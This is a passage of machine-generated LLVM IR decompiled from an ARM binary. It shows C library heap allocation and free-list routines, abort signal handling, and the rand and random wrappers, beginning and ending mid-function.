  %v3_d704 = load i32, i32* %v2_d704, align 4
  %v1_d708 = add i32 %v0_d704, 4
  %v2_d708 = inttoptr i32 %v1_d708 to i32*
  %v3_d708 = load i32, i32* %v2_d708, align 4
  %v2_d70c = icmp eq i32 %v3_d704, 0
  br i1 %v2_d70c, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_d710 = add i32 %v3_d704, 4
  %v4_d710 = inttoptr i32 %v3_d710 to i32*
  store i32 %v3_d708, i32* %v4_d710, align 4
  %v1_d718 = load i32, i32* @ip, align 4
  store i32 %v1_d718, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_d714 = load i32, i32* %r1.global-to-local, align 4
  %v3_d714 = inttoptr i32 %v2_d714 to i32*
  store i32 %v3_d708, i32* %v3_d714, align 4
  %v1_d71c.pre = load i32, i32* @ip, align 4
  store i32 %v1_d71c.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_d728 = phi i32 [ %v0_d728.pre, %.thread._crit_edge ], [ %v1_d718, %bb28 ], [ %v1_d71c.pre, %.thread5 ]
  %v0_d720 = phi i32 [ %v0_d720.pre, %.thread._crit_edge ], [ %v1_d718, %bb28 ], [ %v1_d71c.pre, %.thread5 ]
  %v1_d720 = load i32, i32* %r0.global-to-local, align 4
  %v2_d720 = sub i32 %v1_d720, %v0_d720
  %v1_d724 = add i32 %v2_d720, 12
  store i32 %v1_d724, i32* %r0.global-to-local, align 4
  %v1_d728 = load i32, i32* %r4.global-to-local, align 4
  %v2_d728 = inttoptr i32 %v1_d728 to i32*
  store i32 %v0_d728, i32* %v2_d728, align 4
  %v2_d72c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d72c, i32* %r4.global-to-local, align 4
  ret i32 %v1_d724

dec_label_pc_d730:                                ; preds = %dec_label_pc_d6d4
  %v1_d730 = add i32 %v2_d6ec, 4
  %v2_d730 = inttoptr i32 %v1_d730 to i32*
  %v3_d730 = load i32, i32* %v2_d730, align 4
  store i32 %v3_d730, i32* %r0.global-to-local, align 4
  %v2_d734 = icmp eq i32 %v3_d730, 0
  br i1 %v2_d734, label %dec_label_pc_d734.dec_label_pc_d73c_crit_edge, label %dec_label_pc_d6d4

dec_label_pc_d734.dec_label_pc_d73c_crit_edge:    ; preds = %dec_label_pc_d730
  br label %dec_label_pc_d73c

dec_label_pc_d73c:                                ; preds = %dec_label_pc_d734.dec_label_pc_d73c_crit_edge, %dec_label_pc_d734.preheader
  store i32 %v3_d6b0, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_d730, { 1, 2, 0 }
  uselistorder i32 %v0_d704, { 1, 0 }
  uselistorder i32 %v2_d6d4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_d6ec, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_d6e8, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_d6d4, { 1, 0 }
  uselistorder label %dec_label_pc_d734.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_d744 = load i32, i32* %arg1, align 4
  store i32 %v2_d744, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_d7bc6 = icmp eq i32 %v2_d744, 0
  br i1 %v2_d7bc6, label %dec_label_pc_d7c4, label %dec_label_pc_d750

dec_label_pc_d750:                                ; preds = %entry, %dec_label_pc_d7b8
  %v0_d790 = phi i32 [ %v3_d7b8, %dec_label_pc_d7b8 ], [ %v2_d744, %entry ]
  %v1_d750 = inttoptr i32 %v0_d790 to i32*
  %v2_d750 = load i32, i32* %v1_d750, align 4
  store i32 %v2_d750, i32* %r0.global-to-local, align 4
  %v2_d754 = sub i32 %v0_d790, %v2_d750
  %v1_d758 = add i32 %v2_d754, 12
  %v3_d75c = icmp uge i32 %v1_d758, %arg2
  %v9_d75c = icmp eq i32 %v1_d758, %arg2
  %v2_d760 = xor i1 %v9_d75c, true
  %v3_d760 = and i1 %v3_d75c, %v2_d760
  br i1 %v3_d760, label %dec_label_pc_d7b8, label %dec_label_pc_d764

dec_label_pc_d764:                                ; preds = %dec_label_pc_d750
  br i1 %v9_d75c, label %dec_label_pc_d768, label %dec_label_pc_d7c4

dec_label_pc_d768:                                ; preds = %dec_label_pc_d764
  %v1_d768 = add i32 %arg3, 3
  %v1_d76c = and i32 %v1_d768, -4
  store i32 %v1_d76c, i32* %r2.global-to-local, align 4
  %v2_d770 = sub i32 %v2_d750, %v1_d76c
  %v3_d770 = icmp ult i32 %v2_d750, %v1_d76c
  br i1 %v3_d770, label %dec_label_pc_d7c4, label %dec_label_pc_d778

dec_label_pc_d778:                                ; preds = %dec_label_pc_d768
  %v1_d778 = add i32 %v1_d76c, 44
  %v3_d77c = icmp ult i32 %v2_d750, %v1_d778
  br i1 %v3_d77c, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_d778
  store i32 %v2_d770, i32* %v1_d750, align 4
  %v1_d788 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_d788, i32* %r0.global-to-local, align 4
  ret i32 %v1_d788

.thread2:                                         ; preds = %dec_label_pc_d778
  %v1_d790 = add i32 %v0_d790, 4
  %v2_d790 = inttoptr i32 %v1_d790 to i32*
  %v3_d790 = load i32, i32* %v2_d790, align 4
  store i32 %v3_d790, i32* %r2.global-to-local, align 4
  %v2_d794 = icmp eq i32 %v3_d790, 0
  br i1 %v2_d794, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_d798 = add i32 %v0_d790, 8
  %v3_d798 = inttoptr i32 %v2_d798 to i32*
  %v4_d798 = load i32, i32* %v3_d798, align 4
  %v3_d79c = add i32 %v3_d790, 8
  %v4_d79c = inttoptr i32 %v3_d79c to i32*
  store i32 %v4_d798, i32* %v4_d79c, align 4
  %v0_d7a0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_d7a0 = phi i32 [ %v0_d790, %.thread2 ], [ %v0_d7a0.pre, %bb17 ]
  %v1_d7a0 = add i32 %v0_d7a0, 8
  %v2_d7a0 = inttoptr i32 %v1_d7a0 to i32*
  %v3_d7a0 = load i32, i32* %v2_d7a0, align 4
  store i32 %v3_d7a0, i32* %r2.global-to-local, align 4
  %v1_d7a4 = add i32 %v0_d7a0, 4
  %v2_d7a4 = inttoptr i32 %v1_d7a4 to i32*
  %v3_d7a4 = load i32, i32* %v2_d7a4, align 4
  %v2_d7a8 = icmp eq i32 %v3_d7a0, 0
  br i1 %v2_d7a8, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_d7ac = add i32 %v3_d7a0, 4
  %v4_d7ac = inttoptr i32 %v3_d7ac to i32*
  store i32 %v3_d7a4, i32* %v4_d7ac, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_d7b0 = load i32, i32* %lr.global-to-local, align 4
  %v3_d7b0 = inttoptr i32 %v2_d7b0 to i32*
  store i32 %v3_d7a4, i32* %v3_d7b0, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_d7b4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_d7b4

dec_label_pc_d7b8:                                ; preds = %dec_label_pc_d750
  %v1_d7b8 = add i32 %v0_d790, 4
  %v2_d7b8 = inttoptr i32 %v1_d7b8 to i32*
  %v3_d7b8 = load i32, i32* %v2_d7b8, align 4
  store i32 %v3_d7b8, i32* %ip.global-to-local, align 4
  %v2_d7bc = icmp eq i32 %v3_d7b8, 0
  br i1 %v2_d7bc, label %dec_label_pc_d7bc.dec_label_pc_d7c4.loopexit_crit_edge, label %dec_label_pc_d750

dec_label_pc_d7bc.dec_label_pc_d7c4.loopexit_crit_edge: ; preds = %dec_label_pc_d7b8
  br label %dec_label_pc_d7c4

dec_label_pc_d7c4:                                ; preds = %dec_label_pc_d768, %entry, %dec_label_pc_d7bc.dec_label_pc_d7c4.loopexit_crit_edge, %dec_label_pc_d764
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_d7b8, { 1, 2, 0 }
  uselistorder i32 %v0_d7a0, { 1, 0 }
  uselistorder i32 %v1_d76c, { 0, 2, 1, 3 }
  uselistorder i1 %v9_d75c, { 1, 0 }
  uselistorder i32 %v2_d750, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_d790, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_d7c4, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_d750, { 1, 0 }
}

define i32 @__heap_link_free_area() local_unnamed_addr {
entry:
  %v0_d7cc = load i32, i32* @r2, align 4
  %v2_d7cc = icmp eq i32 %v0_d7cc, 0
  %v0_d7d0 = load i32, i32* @r3, align 4
  %v1_d7d0 = load i32, i32* @r1, align 4
  %v2_d7d0 = add i32 %v1_d7d0, 4
  %v3_d7d0 = inttoptr i32 %v2_d7d0 to i32*
  store i32 %v0_d7d0, i32* %v3_d7d0, align 4
  %v0_d7d4 = load i32, i32* @r2, align 4
  %v1_d7d4 = load i32, i32* @r1, align 4
  %v2_d7d4 = add i32 %v1_d7d4, 8
  %v3_d7d4 = inttoptr i32 %v2_d7d4 to i32*
  store i32 %v0_d7d4, i32* %v3_d7d4, align 4
  %v1_d7dc = load i32, i32* @r1, align 4
  br i1 %v2_d7cc, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_d7d8 = load i32, i32* @r2, align 4
  %v3_d7d8 = add i32 %v2_d7d8, 4
  %v4_d7d8 = inttoptr i32 %v3_d7d8 to i32*
  store i32 %v1_d7dc, i32* %v4_d7d8, align 4
  br label %bb1

.thread:                                          ; preds = %entry
  %v2_d7dc = load i32, i32* @r0, align 4
  %v3_d7dc = inttoptr i32 %v2_d7dc to i32*
  store i32 %v1_d7dc, i32* %v3_d7dc, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_d7e0 = load i32, i32* @r3, align 4
  %v2_d7e0 = icmp eq i32 %v0_d7e0, 0
  br i1 %v2_d7e0, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_d7e4 = load i32, i32* @r1, align 4
  %v3_d7e4 = add i32 %v0_d7e0, 8
  %v4_d7e4 = inttoptr i32 %v3_d7e4 to i32*
  store i32 %v1_d7e4, i32* %v4_d7e4, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_d7e8 = load i32, i32* @r0, align 4
  ret i32 %v1_d7e8

; uselistorder directives
  uselistorder i32 %v1_d7dc, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__heap_link_free_area_after() local_unnamed_addr {
entry:
  %v0_d7ec = load i32, i32* @r2, align 4
  %v2_d7ec = icmp eq i32 %v0_d7ec, 0
  %v1_d7f0 = load i32, i32* @r1, align 4
  br i1 %v2_d7ec, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_d7f0 = load i32, i32* @r0, align 4
  %v3_d7f0 = inttoptr i32 %v2_d7f0 to i32*
  store i32 %v1_d7f0, i32* %v3_d7f0, align 4
  br label %bb2

.thread:                                          ; preds = %entry
  %v3_d7f4 = add i32 %v0_d7ec, 4
  %v4_d7f4 = inttoptr i32 %v3_d7f4 to i32*
  store i32 %v1_d7f0, i32* %v4_d7f4, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_d7f8 = load i32, i32* @r2, align 4
  %v1_d7f8 = load i32, i32* @r1, align 4
  %v2_d7f8 = add i32 %v1_d7f8, 8
  %v3_d7f8 = inttoptr i32 %v2_d7f8 to i32*
  store i32 %v0_d7f8, i32* %v3_d7f8, align 4
  %v1_d7fc = load i32, i32* @r0, align 4
  ret i32 %v1_d7fc

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_d800 = load i32, i32* @r4, align 4
  store i32 %v3_d800, i32* %stack_var_-20, align 4
  %v2_d804 = load i32, i32* %arg1, align 4
  store i32 %v2_d804, i32* %r4.global-to-local, align 4
  %v2_d808 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_d8242 = icmp eq i32 %v2_d804, 0
  br i1 %v2_d8242, label %dec_label_pc_d8d4, label %dec_label_pc_d814

dec_label_pc_d814:                                ; preds = %entry, %dec_label_pc_d81c
  %v0_d864 = phi i32 [ %v0_d86c, %dec_label_pc_d81c ], [ 0, %entry ]
  %v0_d86c = phi i32 [ %v3_d820, %dec_label_pc_d81c ], [ %v2_d804, %entry ]
  %v1_d8285.in = phi i32 [ %v3_d820, %dec_label_pc_d81c ], [ %v2_d804, %entry ]
  %v1_d8285 = add i32 %v1_d8285.in, 12
  %v3_d814 = icmp ult i32 %v1_d8285, %arg2
  br i1 %v3_d814, label %dec_label_pc_d81c, label %dec_label_pc_d834

dec_label_pc_d81c:                                ; preds = %dec_label_pc_d814
  store i32 %v0_d86c, i32* %r6.global-to-local, align 4
  %v1_d820 = add i32 %v0_d86c, 4
  %v2_d820 = inttoptr i32 %v1_d820 to i32*
  %v3_d820 = load i32, i32* %v2_d820, align 4
  store i32 %v3_d820, i32* %r4.global-to-local, align 4
  %v2_d824 = icmp eq i32 %v3_d820, 0
  br i1 %v2_d824, label %dec_label_pc_d824.dec_label_pc_d8d4.loopexit_crit_edge, label %dec_label_pc_d814

dec_label_pc_d834:                                ; preds = %dec_label_pc_d814
  %v1_d834 = inttoptr i32 %v0_d86c to i32*
  %v2_d834 = load i32, i32* %v1_d834, align 4
  store i32 %v2_d834, i32* @ip, align 4
  %v2_d838 = sub i32 %v0_d86c, %v2_d834
  %v1_d83c = add i32 %v2_d838, 12
  %v3_d840 = icmp uge i32 %v1_d83c, %v2_d808
  %v9_d840 = icmp eq i32 %v1_d83c, %v2_d808
  %v2_d844 = xor i1 %v9_d840, true
  %v3_d844 = and i1 %v3_d840, %v2_d844
  br i1 %v3_d844, label %dec_label_pc_d8d4, label %dec_label_pc_d848

dec_label_pc_d848:                                ; preds = %dec_label_pc_d834
  %v2_d848 = add i32 %v2_d834, %arg3
  store i32 %v2_d848, i32* %r7.global-to-local, align 4
  br i1 %v9_d840, label %dec_label_pc_d850, label %dec_label_pc_d87c

dec_label_pc_d850:                                ; preds = %dec_label_pc_d848
  %v2_d850 = icmp eq i32 %v0_d864, 0
  br i1 %v2_d850, label %dec_label_pc_d8c8, label %dec_label_pc_d858

dec_label_pc_d858:                                ; preds = %dec_label_pc_d850
  %v1_d858 = add i32 %v0_d864, 12
  %v9_d85c = icmp eq i32 %v1_d858, %arg2
  br i1 %v9_d85c, label %dec_label_pc_d864, label %dec_label_pc_d8c8

dec_label_pc_d864:                                ; preds = %dec_label_pc_d858
  %v1_d864 = inttoptr i32 %v0_d864 to i32*
  %v2_d864 = load i32, i32* %v1_d864, align 4
  %v1_d868 = add i32 %v0_d864, 8
  %v2_d868 = inttoptr i32 %v1_d868 to i32*
  %v3_d868 = load i32, i32* %v2_d868, align 4
  store i32 %v3_d868, i32* @r2, align 4
  store i32 %v0_d86c, i32* @r1, align 4
  %v2_d870 = add i32 %v2_d864, %v2_d848
  store i32 %v2_d870, i32* %r7.global-to-local, align 4
  %v0_d874 = call i32 @__heap_link_free_area_after()
  br label %dec_label_pc_d8c8

dec_label_pc_d87c:                                ; preds = %dec_label_pc_d848
  %v1_d87c = add i32 %v0_d86c, 4
  %v2_d87c = inttoptr i32 %v1_d87c to i32*
  %v3_d87c = load i32, i32* %v2_d87c, align 4
  store i32 %v3_d87c, i32* %r5.global-to-local, align 4
  %v2_d880 = icmp eq i32 %v3_d87c, 0
  br i1 %v2_d880, label %dec_label_pc_d8b4, label %dec_label_pc_d888

dec_label_pc_d888:                                ; preds = %dec_label_pc_d87c
  %v1_d888 = inttoptr i32 %v3_d87c to i32*
  %v2_d888 = load i32, i32* %v1_d888, align 4
  store i32 %v2_d888, i32* @ip, align 4
  %v2_d88c = sub i32 %v3_d87c, %v2_d888
  %v1_d890 = add i32 %v2_d88c, 12
  %v9_d894 = icmp eq i32 %v2_d808, %v1_d890
  br i1 %v9_d894, label %dec_label_pc_d89c, label %dec_label_pc_d8b4

dec_label_pc_d89c:                                ; preds = %dec_label_pc_d888
  store i32 %v0_d864, i32* @r2, align 4
  store i32 %v3_d87c, i32* @r1, align 4
  %v2_d8a4 = add i32 %v2_d888, %v2_d848
  store i32 %v2_d8a4, i32* %r7.global-to-local, align 4
  %v0_d8a8 = call i32 @__heap_link_free_area_after()
  %v0_d8ac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_d8ac, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d8c8

dec_label_pc_d8b4:                                ; preds = %dec_label_pc_d888, %dec_label_pc_d87c
  %v2_d8b4 = add i32 %v0_d86c, %arg3
  store i32 %v2_d8b4, i32* %r4.global-to-local, align 4
  store i32 %v3_d87c, i32* @r3, align 4
  store i32 %v0_d864, i32* @r2, align 4
  store i32 %v2_d8b4, i32* @r1, align 4
  %v0_d8c4 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_d8c8

dec_label_pc_d8c8:                                ; preds = %dec_label_pc_d858, %dec_label_pc_d850, %dec_label_pc_d89c, %dec_label_pc_d864, %dec_label_pc_d8b4
  %v0_d8c8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d8c8, i32* %r5.global-to-local, align 4
  %v0_d8cc = load i32, i32* %r7.global-to-local, align 4
  %v2_d8cc = inttoptr i32 %v0_d8c8 to i32*
  store i32 %v0_d8cc, i32* %v2_d8cc, align 4
  br label %dec_label_pc_d8ec

dec_label_pc_d824.dec_label_pc_d8d4.loopexit_crit_edge: ; preds = %dec_label_pc_d81c
  br label %dec_label_pc_d8d4

dec_label_pc_d8d4:                                ; preds = %entry, %dec_label_pc_d824.dec_label_pc_d8d4.loopexit_crit_edge, %dec_label_pc_d834
  %v1_d8d4 = add i32 %v2_d808, -12
  store i32 %v1_d8d4, i32* %r5.global-to-local, align 4
  %v3_d8d8 = inttoptr i32 %v1_d8d4 to i32*
  store i32 %arg3, i32* %v3_d8d8, align 4
  %v0_d8dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d8dc, i32* @r3, align 4
  %v0_d8e0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_d8e0, i32* @r2, align 4
  %v0_d8e4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_d8e4, i32* @r1, align 4
  %v0_d8e8 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_d8ec

dec_label_pc_d8ec:                                ; preds = %dec_label_pc_d8c8, %dec_label_pc_d8d4
  %v0_d8ec = load i32, i32* %r5.global-to-local, align 4
  %v2_d8f0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_d8f0, i32* @r4, align 4
  ret i32 %v0_d8ec

; uselistorder directives
  uselistorder i32 %v3_d87c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_d840, { 1, 0 }
  uselistorder i32 %v3_d820, { 2, 3, 1, 0 }
  uselistorder i32 %v0_d86c, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_d864, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @__heap_link_free_area, { 1, 0 }
  uselistorder i32 ()* @__heap_link_free_area_after, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d8ec, { 1, 0 }
  uselistorder label %dec_label_pc_d8d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d8c8, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_d814, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
dec_label_pc_d910.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_d8f4 = ptrtoint i32* %stack_var_-268 to i32
  %v1_d904 = call i32 @__pthread_return_0()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_d910 = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_d910

dec_label_pc_d910:                                ; preds = %dec_label_pc_d910.lr.ph, %dec_label_pc_d910
  %v1_d914 = phi i32 [ 31, %dec_label_pc_d910.lr.ph ], [ %v1_d920, %dec_label_pc_d910 ]
  %v4_d914 = mul i32 %v1_d914, 4
  %v5_d914 = add i32 %v4_d914, %v2_d910
  %v2_d91c = add i32 %v5_d914, -128
  %v3_d91c = inttoptr i32 %v2_d91c to i32*
  store i32 0, i32* %v3_d91c, align 4
  %v0_d920 = load i32, i32* %r1.global-to-local, align 4
  %v1_d920 = add i32 %v0_d920, -1
  store i32 %v1_d920, i32* %r1.global-to-local, align 4
  %v6_d920 = icmp slt i32 %v1_d920, 0
  br i1 %v6_d920, label %dec_label_pc_d928, label %dec_label_pc_d910

dec_label_pc_d928:                                ; preds = %dec_label_pc_d910
  %v2_d928 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_d928, i32* @r4, align 4
  store i32 6, i32* %r1.global-to-local, align 4
  %v2_d934 = call i32 @__sigaddset(i32 %v2_d928, i32 6)
  %v2_d938 = icmp eq i32 %v2_d934, 0
  br i1 %v2_d938, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_d928
  store i32 %v2_d928, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_d928, %bb
  store i32 55628, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_d938, i32 ptrtoint (i32* @global_var_ec4c.562 to i32))
  %v2_d950 = load i32, i32* @global_var_20e08.564, align 4
  %v2_d954 = icmp eq i32 %v2_d950, 0
  br i1 %v2_d954, label %dec_label_pc_d95c, label %dec_label_pc_d98c

dec_label_pc_d95c:                                ; preds = %.thread1
  store i32 1, i32* @global_var_20e08.564, align 4
  br label %dec_label_pc_d964

dec_label_pc_d964:                                ; preds = %dec_label_pc_d9dc, %dec_label_pc_d95c
  store i32 55668, i32* @lr, align 4
  %v1_d970 = call i32 @__pthread_return_0()
  %v1_d978 = call i32 @__raise(i32 6)
  store i32 55692, i32* @lr, align 4
  %v1_d988 = call i32 @__pthread_return_0()
  %v2_d990.pre = load i32, i32* @global_var_20e08.564, align 4
  br label %dec_label_pc_d98c

dec_label_pc_d98c:                                ; preds = %.thread1, %dec_label_pc_d964
  %v0_da00 = phi i32 [ %v2_d950, %.thread1 ], [ %v2_d990.pre, %dec_label_pc_d964 ]
  store i32 ptrtoint (i32* @global_var_20e08.564 to i32), i32* %ip.global-to-local, align 4
  %v7_d994 = icmp eq i32 %v0_da00, 1
  br i1 %v7_d994, label %dec_label_pc_d9c4.lr.ph, label %dec_label_pc_d9f8

dec_label_pc_d9c4.lr.ph:                          ; preds = %dec_label_pc_d98c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_20e08.564, align 4
  %v2_d9b0 = bitcast i32* %stack_var_-268 to i8*
  %v3_d9b0 = call i32 @__GI_memset(i8* %v2_d9b0, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d9c4

dec_label_pc_d9c4:                                ; preds = %dec_label_pc_d9c4.lr.ph, %dec_label_pc_d9c4
  %v1_d9c8 = phi i32 [ 31, %dec_label_pc_d9c4.lr.ph ], [ %v1_d9d4, %dec_label_pc_d9c4 ]
  %v4_d9c8 = mul i32 %v1_d9c8, 4
  %v5_d9c8 = add i32 %v4_d9c8, %v2_d910
  %v2_d9d0 = add i32 %v5_d9c8, -264
  %v3_d9d0 = inttoptr i32 %v2_d9d0 to i32*
  store i32 -1, i32* %v3_d9d0, align 4
  %v0_d9d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_d9d4 = add i32 %v0_d9d4, -1
  store i32 %v1_d9d4, i32* %r1.global-to-local, align 4
  %v6_d9d4 = icmp slt i32 %v1_d9d4, 0
  br i1 %v6_d9d4, label %dec_label_pc_d9dc, label %dec_label_pc_d9c4

dec_label_pc_d9dc:                                ; preds = %dec_label_pc_d9c4
  store i32 %v2_d8f4, i32* %r1.global-to-local, align 4
  %v4_d9f0 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_d964

dec_label_pc_d9f8:                                ; preds = %dec_label_pc_d98c
  %v7_d9f8 = icmp eq i32 %v0_da00, 2
  br i1 %v7_d9f8, label %dec_label_pc_da00, label %dec_label_pc_da0c

dec_label_pc_da00:                                ; preds = %dec_label_pc_d9f8
  store i32 3, i32* @global_var_20e08.564, align 4
  %v0_da08 = call i32 @abort()
  %v2_da0c.pre = load i32, i32* @global_var_20e08.564, align 4
  br label %dec_label_pc_da0c

dec_label_pc_da0c:                                ; preds = %dec_label_pc_d9f8, %dec_label_pc_da00
  %v1_da14 = phi i32 [ %v0_da00, %dec_label_pc_d9f8 ], [ %v2_da0c.pre, %dec_label_pc_da00 ]
  %v7_da10 = icmp eq i32 %v1_da14, 3
  br i1 %v7_da10, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_da0c
  %v2_da1c = load i32, i32* %ip.global-to-local, align 4
  %v3_da1c = inttoptr i32 %v2_da1c to i32*
  store i32 4, i32* %v3_da1c, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_da0c, %bb27
  call void @__pseudo_cond_branch(i1 %v7_da10, i32 ptrtoint (i32* @global_var_ea58.566 to i32))
  br label %dec_label_pc_da24

dec_label_pc_da24:                                ; preds = %dec_label_pc_da24, %.thread3
  %v0_da24 = call i32 @abort()
  br label %dec_label_pc_da24

; uselistorder directives
  uselistorder i32 %v1_d9d4, { 2, 1, 0 }
  uselistorder i32 %v1_d920, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 1, 2, 5, 6, 7, 9, 8, 0 }
  uselistorder i32* @global_var_20e08.564, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_da0c, { 1, 0 }
  uselistorder label %dec_label_pc_d9c4, { 1, 0 }
  uselistorder label %dec_label_pc_d98c, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_d910, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_da3c = call i32 @random()
  ret i32 %v0_da3c

; uselistorder directives
  uselistorder i32 ()* @random, { 6, 2, 3, 0, 4, 1, 5 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_da40 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1e6d0.568 to i32), i32* @r4, align 4
  %v2_da48 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_da48, i32* @r0, align 4
  %v1_da60 = call i32 @__pthread_return_void()
  %v1_da70 = call i32 @__pthread_return_0()
  %v2_da74 = ptrtoint i32* %stack_var_-16 to i32
  %v3_da7c = call i32 @__GI_random_r(i32* inttoptr (i32 124648 to i32*), i32 %v2_da74)
  store i32 %v2_da48, i32* @r0, align 4
  store i32 55956, i32* @lr, align 4
  %v1_da90 = call i32 @__pthread_return_void()
  %v3_da94 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_da40, i32* @r4, align 4
  ret i32 %v3_da94
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_dac0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_dac0, i32* @r0, align 4
  %v1_dadc = call i32 @__pthread_return_void()
  %v1_daec = call i32 @__pthread_return_0()
